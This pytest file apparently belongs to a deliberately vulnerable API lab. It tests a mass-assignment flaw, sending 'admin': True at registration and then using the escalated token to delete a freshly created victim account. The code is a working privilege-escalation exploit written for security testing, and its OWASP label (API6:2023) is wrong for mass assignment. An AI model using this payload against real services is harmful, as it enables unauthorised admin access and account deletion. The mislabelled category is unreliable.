"""
Test Mass Assignment Vulnerability (API6:2023 Unrestricted Access to Sensitive Business Flows)

This test demonstrates mass assignment vulnerability in the POST /users/v1/register endpoint.
When vuln=1, the endpoint accepts an 'admin' field in the registration payload, allowing
users to escalate their privileges during registration.

OWASP Reference: https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/

Vulnerability Location: api_views/users.py:60-66
"""

import pytest
import requests
import uuid


def test_mass_assignment_create_admin_user(api_base_url: str):
    """
    Test mass assignment by injecting 'admin: true' during user registration.

    This demonstrates that when vuln=1, a regular user can register themselves
    as an administrator by including the 'admin' field in the registration payload.

    Expected behavior when vuln=1:
        - Registration succeeds with admin=True
        - User is created with admin privileges
        - User can perform admin-only actions (like deleting other users)

    Expected behavior when vuln=0:
        - The 'admin' field is ignored
        - User is created as a regular user (admin=False)
    """
    # Generate unique username to avoid conflicts
    test_username = f"hacker_{uuid.uuid4().hex[:8]}"
    test_email = f"{test_username}@test.com"
    test_password = "malicious123"

    # Attempt to register with admin=True via mass assignment
    registration_payload = {
        "username": test_username,
        "password": test_password,
        "email": test_email,
        "admin": True  # This field should not be user-controllable!
    }

    response = requests.post(
        f"{api_base_url}/users/v1/register",
        json=registration_payload
    )

    # Registration should succeed
    assert response.status_code == 200, \
        f"Registration failed. Expected 200, got {response.status_code}"

    data = response.json()
    assert data.get("status") == "success", \
        f"Registration did not succeed: {data}"

    # Now login with the newly created user
    login_response = requests.post(
        f"{api_base_url}/users/v1/login",
        json={"username": test_username, "password": test_password}
    )

    assert login_response.status_code == 200, \
        "Login failed for newly created user"

    login_data = login_response.json()
    assert login_data.get("status") == "success", \
        "Login did not succeed"

    token = login_data.get("auth_token")
    assert token is not None, "No auth token received"

    # Try to perform an admin-only action: delete a user
    # First, create a victim user to delete
    victim_username = f"victim_{uuid.uuid4().hex[:8]}"
    victim_response = requests.post(
        f"{api_base_url}/users/v1/register",
        json={
            "username": victim_username,
            "password": "victim123",
            "email": f"{victim_username}@test.com"
        }
    )
    assert victim_response.status_code == 200, "Failed to create victim user"

    # Attempt to delete the victim user using our potentially-admin user's token
    delete_headers = {"Authorization": f"Bearer {token}"}
    delete_response = requests.delete(
        f"{api_base_url}/users/v1/{victim_username}",
        headers=delete_headers
    )

    # If mass assignment worked, we should be able to delete the user (200)
    # If it was patched, we should get 401 (unauthorized)
    assert delete_response.status_code == 200, \
        f"Mass assignment vulnerability appears patched. " \
        f"Cannot delete user as non-admin. Expected 200, got {delete_response.status_code}"

    delete_data = delete_response.json()
    assert delete_data.get("status") == "success", \
        f"User deletion failed: {delete_data}"


def test_mass_assignment_with_false_admin(api_base_url: str):
    """
    Test mass assignment with admin=False to verify the field is being processed.

    This is a control test to verify that the 'admin' field in the payload
    is actually being read and processed by the backend.

    Expected behavior when vuln=1:
        - User is created with admin=False
        - Cannot perform admin actions

    Expected behavior when vuln=0:
        - Same result (field is ignored, defaults to False)
    """
    test_username = f"regular_{uuid.uuid4().hex[:8]}"
    test_email = f"{test_username}@test.com"
    test_password = "regular123"

    registration_payload = {
        "username": test_username,
        "password": test_password,
        "email": test_email,
        "admin": False  # Explicitly set to False
    }

    response = requests.post(
        f"{api_base_url}/users/v1/register",
        json=registration_payload
    )

    assert response.status_code == 200, \
        f"Registration failed. Expected 200, got {response.status_code}"

    # Login and verify cannot perform admin actions
    login_response = requests.post(
        f"{api_base_url}/users/v1/login",
        json={"username": test_username, "password": test_password}
    )

    assert login_response.status_code == 200, "Login failed"

    token = login_response.json().get("auth_token")
    assert token is not None, "No auth token received"

    # Try to delete admin user (should fail)
    delete_headers = {"Authorization": f"Bearer {token}"}
    delete_response = requests.delete(
        f"{api_base_url}/users/v1/admin",
        headers=delete_headers
    )

    # Should fail with 401 (only admins can delete)
    assert delete_response.status_code == 401, \
        f"Non-admin user should not be able to delete users. Got {delete_response.status_code}"


def test_normal_registration_without_admin_field(api_base_url: str):
    """
    Control test: Verify normal registration works without the admin field.

    This ensures that regular user registration (without attempting mass assignment)
    functions correctly.

    Expected behavior (both vuln=1 and vuln=0):
        - User is created successfully
        - User has regular (non-admin) privileges
        - Cannot perform admin actions
    """
    test_username = f"normal_{uuid.uuid4().hex[:8]}"
    test_email = f"{test_username}@test.com"
    test_password = "normal123"

    registration_payload = {
        "username": test_username,
        "password": test_password,
        "email": test_email
        # No 'admin' field at all
    }

    response = requests.post(
        f"{api_base_url}/users/v1/register",
        json=registration_payload
    )

    assert response.status_code == 200, \
        f"Normal registration failed. Expected 200, got {response.status_code}"

    data = response.json()
    assert data.get("status") == "success", \
        f"Registration did not succeed: {data}"

    # Login and verify
    login_response = requests.post(
        f"{api_base_url}/users/v1/login",
        json={"username": test_username, "password": test_password}
    )

    assert login_response.status_code == 200, "Login failed"

    token = login_response.json().get("auth_token")
    assert token is not None, "No auth token received"

    # Try to delete a user (should fail because we're not admin)
    delete_headers = {"Authorization": f"Bearer {token}"}
    delete_response = requests.delete(
        f"{api_base_url}/users/v1/admin",
        headers=delete_headers
    )

    # Should fail with 401
    assert delete_response.status_code == 401, \
        f"Non-admin user should not be able to delete users"


def test_mass_assignment_check_user_profile(api_base_url: str):
    """
    Test verifying admin status by checking the /me endpoint.

    After creating a user with admin=true via mass assignment, verify that
    the user profile actually shows admin privileges.

    Expected behavior when vuln=1:
        - /me endpoint shows admin: true for the malicious user

    Expected behavior when vuln=0:
        - /me endpoint shows admin: false
    """
    test_username = f"checkadmin_{uuid.uuid4().hex[:8]}"
    test_email = f"{test_username}@test.com"
    test_password = "check123"

    # Register with admin=True
    registration_payload = {
        "username": test_username,
        "password": test_password,
        "email": test_email,
        "admin": True
    }

    response = requests.post(
        f"{api_base_url}/users/v1/register",
        json=registration_payload
    )

    assert response.status_code == 200, "Registration failed"

    # Login
    login_response = requests.post(
        f"{api_base_url}/users/v1/login",
        json={"username": test_username, "password": test_password}
    )

    assert login_response.status_code == 200, "Login failed"

    token = login_response.json().get("auth_token")
    assert token is not None, "No auth token received"

    # Check /me endpoint
    me_headers = {"Authorization": f"Bearer {token}"}
    me_response = requests.get(
        f"{api_base_url}/me",
        headers=me_headers
    )

    assert me_response.status_code == 200, \
        f"/me endpoint failed. Expected 200, got {me_response.status_code}"

    me_data = me_response.json()
    assert me_data.get("status") == "success", "Me endpoint did not succeed"

    user_data = me_data.get("data", {})

    # When vulnerable, admin should be True
    # When secure, admin should be False
    assert user_data.get("admin") is True, \
        f"Mass assignment vulnerability appears patched. " \
        f"User admin status is {user_data.get('admin')}, expected True"
